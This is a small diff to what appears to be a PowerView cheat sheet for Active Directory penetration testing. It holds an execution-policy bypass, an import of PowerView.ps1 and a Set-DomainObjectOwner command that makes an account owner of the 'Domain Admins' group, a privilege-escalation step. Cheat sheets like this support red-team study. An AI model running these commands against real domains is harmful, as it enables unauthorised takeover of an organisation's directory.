@@ -1,5 +1,6 @@
-####Power view cheet
+#### Power view cheet
 -----------------------------------------------------------------------
+# Commands
 powershell -ep bypass
 Import-Module .\PowerView.ps1
 Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'goodboy'
